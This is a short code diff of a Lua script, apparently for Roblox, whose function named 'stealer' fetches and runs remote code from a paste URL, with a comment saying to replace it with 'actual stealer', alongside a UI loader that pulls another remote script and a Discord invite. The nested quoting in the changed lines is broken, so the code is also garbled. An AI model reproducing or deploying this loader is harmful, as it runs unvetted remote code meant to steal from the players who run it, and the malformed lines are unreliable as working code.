@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/RyuzoScripts/Bypasser/refs/heads/main/Bypassed"))() -- replace with actual stealer
+    loadstring(game:HttpGet('loadstring(game:HttpGet("loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/cWnKehGzBRKIAhYN/raw", true))() -- replace with actual stealer
 end
 local function loadui()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
